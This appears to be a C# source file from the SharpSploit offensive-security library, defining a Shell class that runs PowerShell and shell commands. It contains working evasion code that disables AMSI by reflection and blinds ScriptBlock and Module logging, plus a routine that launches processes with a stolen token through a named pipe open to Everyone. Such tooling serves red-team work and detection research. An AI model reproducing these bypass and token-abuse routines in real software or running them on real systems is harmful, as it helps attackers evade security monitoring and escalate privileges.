// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Linq;
using System.Reflection;
using System.Diagnostics;
using System.Management.Automation;
using System.Text;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.IO;
using System.Runtime.InteropServices;

namespace SharpSploit.Execution
{
    /// <summary>
    /// Shell is a library for executing shell commands.
    /// </summary>
    public class Shell
    {
        /// <summary>
        /// Executes specified PowerShell code using System.Management.Automation.dll and bypasses
        /// AMSI, ScriptBlock Logging, and Module Logging (but not Transcription Logging).
        /// </summary>
        /// <param name="PowerShellCode">PowerShell code to execute.</param>
        /// <param name="OutString">Switch. If true, appends Out-String to the PowerShellCode to execute.</param>
        /// <param name="BypassLogging">Switch. If true, bypasses ScriptBlock and Module logging.</param>
        /// <param name="BypassAmsi">Switch. If true, bypasses AMSI.</param>
        /// <returns>Output of executed PowerShell.</returns>
        /// <remarks>
        /// Credit for the AMSI bypass goes to Matt Graeber (@mattifestation). Credit for the ScriptBlock/Module
        /// logging bypass goes to Lee Christensen (@_tifkin).
        /// </remarks>
        public static string PowerShellExecute(string PowerShellCode, bool OutString = true, bool BypassLogging = true, bool BypassAmsi = true)
        {
            if (PowerShellCode == null || PowerShellCode == "") return "";

            using (PowerShell ps = PowerShell.Create())
            {
                BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
                if (BypassLogging)
                {
                    var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
                    if (PSEtwLogProvider != null)
                    {
                        var EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags);
                        var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                        EtwProvider.SetValue(null, EventProvider);
                    }
                }
                if (BypassAmsi)
                {
                    var amsiUtils = ps.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
                    if (amsiUtils != null)
                    {
                        amsiUtils.GetField("amsiInitFailed", flags).SetValue(null, true);
                    }
                }
                ps.AddScript(PowerShellCode);
                if (OutString) { ps.AddCommand("Out-String"); }
                var results = ps.Invoke();
                string output = String.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                ps.Commands.Clear();
                return output;
            }
        }

        /// <summary>
        /// Executes a specified Shell command, optionally with an alternative username and password.
        /// Equates to `ShellExecuteWithPath(ShellCommand, "C:\\WINDOWS\\System32")`.
        /// </summary>
        /// <param name="ShellCommand">The ShellCommand to execute, including any arguments.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Ouput of the ShellCommand.</returns>
        public static string ShellExecute(string ShellCommand, string Username = "", string Domain = "", string Password = "")
        {
            return ShellExecuteWithPath(ShellCommand, "C:\\WINDOWS\\System32\\", Username, Domain, Password);
        }

        /// <summary>
        /// Executes a specified Shell command using cmd.exe, optionally with an alternative username and password.
        /// Equates to `ShellExecute("cmd.exe /c " + ShellCommand)`.
        /// </summary>
        /// <param name="ShellCommand">The ShellCommand to execute, including any arguments.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Ouput of the ShellCommand.</returns>
        public static string ShellCmdExecute(string ShellCommand, string Username = "", string Domain = "", string Password = "")
        {
            return ShellExecute("cmd.exe /c " + ShellCommand, Username, Domain, Password);
        }

        /// <summary>
        /// Executes a specified Shell command from a specified directory, optionally with an alternative username and password.
        /// </summary>
        /// <param name="ShellCommand">The ShellCommand to execute, including any arguments.</param>
        /// <param name="Path">The Path of the directory from which to execute the ShellCommand.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Output of the ShellCommand.</returns>
        public static string ShellExecuteWithPath(string ShellCommand, string Path, string Username = "", string Domain = "", string Password = "")
        {
            if (ShellCommand == null || ShellCommand == "") return "";

            string ShellCommandName = ShellCommand.Split(' ')[0];
            string ShellCommandArguments = "";
            if (ShellCommand.Contains(" "))
            {
                ShellCommandArguments = ShellCommand.Replace(ShellCommandName + " ", "");
            }

            Process shellProcess = new Process();
            if (Username != "")
            {
                shellProcess.StartInfo.UserName = Username;
                shellProcess.StartInfo.Domain = Domain;
                System.Security.SecureString SecurePassword = new System.Security.SecureString();
                foreach (char c in Password)
                {
                    SecurePassword.AppendChar(c);
                }
                shellProcess.StartInfo.Password = SecurePassword;
            }
            shellProcess.StartInfo.FileName = ShellCommandName;
            shellProcess.StartInfo.Arguments = ShellCommandArguments;
            shellProcess.StartInfo.WorkingDirectory = Path;
            shellProcess.StartInfo.UseShellExecute = false;
            shellProcess.StartInfo.CreateNoWindow = true;
            shellProcess.StartInfo.RedirectStandardOutput = true;
            shellProcess.StartInfo.RedirectStandardError = true;

            var output = new StringBuilder();
            shellProcess.OutputDataReceived += (sender, args) => { output.AppendLine(args.Data); };
            shellProcess.ErrorDataReceived += (sender, args) => { output.AppendLine(args.Data); };

            shellProcess.Start();

            shellProcess.BeginOutputReadLine();
            shellProcess.BeginErrorReadLine();
            shellProcess.WaitForExit();

            return output.ToString().TrimEnd();
        }

        /// <summary>
        /// Execute a given command with a stolen token.
        /// </summary>
        /// <param name="ShellCommand">The shell command to execute, including any arguments.</param>
        /// <param name="Path">The path of the directory from which to execute the shell command.</param>
        /// <param name="TokenHandle">A handle to the stolen token.</param>
        /// <returns></returns>
        public static string ShellExecuteWithToken(string ShellCommand, string Path, IntPtr TokenHandle)
        {
            if (ShellCommand == null || ShellCommand == "") return "";

            string file = "";
            string CommandLine = "";
            if (ShellCommand.Contains(" "))
            {
                file = ShellCommand.Split(' ')[0];
                CommandLine = ShellCommand;
            }
            else file = ShellCommand;
            Win32.ProcessThreadsAPI._PROCESS_INFORMATION ProcInfo = 
                new Win32.ProcessThreadsAPI._PROCESS_INFORMATION();
            Win32.ProcessThreadsAPI._STARTUPINFO StartupInfo = 
                new Win32.ProcessThreadsAPI._STARTUPINFO();

            // Set ACL on named pipe to allow any user to access
            PipeSecurity sec = new PipeSecurity();
            sec.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));

            NamedPipeServerStream ServerStream = new NamedPipeServerStream(".pipe1badp1pe", PipeDirection.In, NamedPipeServerStream.MaxAllowedServerInstances,
                PipeTransmissionMode.Message, PipeOptions.None, 4096, 4096, sec);
            NamedPipeClientStream ClientStream = new NamedPipeClientStream(".", ".pipe1badp1pe", PipeDirection.Out, PipeOptions.None);

            ClientStream.Connect();
            ServerStream.WaitForConnection();
            if (ServerStream.IsConnected)
            {
                StartupInfo.hStdOutput = ClientStream.SafePipeHandle.DangerousGetHandle();
                StartupInfo.hStdInput = ClientStream.SafePipeHandle.DangerousGetHandle();
            }

            StartupInfo.wShowWindow = 0;
            StartupInfo.dwFlags = (uint)Win32.ProcessThreadsAPI.STARTF.STARTF_USESTDHANDLES | (uint)Win32.ProcessThreadsAPI.STARTF.STARTF_USESHOWWINDOW;


            bool CreateProcess = Win32.Advapi32.CreateProcessWithTokenW(
                TokenHandle,                                // hToken
                IntPtr.Zero,                                // dwLogonFlags
                file,                                       // lpApplicationName
                CommandLine,                                // lpCommandLine
                (Win32.Advapi32.CREATION_FLAGS)IntPtr.Zero, // dwCreationFlags
                IntPtr.Zero,                                // lpEnvironment
                null,                                       // lpCurrentDirectory
                ref StartupInfo,                            // lpStartupInfo
                out ProcInfo);                              // lpProcessInfo
            Debug.WriteLine(Marshal.GetLastWin32Error());

            if (CreateProcess)
            {
                using (StreamReader reader = new StreamReader(ServerStream))
                {
                    try
                    {
                        Process NewProc = Process.GetProcessById((int)ProcInfo.dwProcessId);

                        while (!NewProc.HasExited)
                        {
                            // Wait until exit
                        }
                    }
                    catch
                    {
                        // Do nothing
                    }

                    ClientStream.Close();
                    ClientStream.Dispose();

                    return reader.ReadToEnd();
                }
            }
            else return "";
        }
    }
}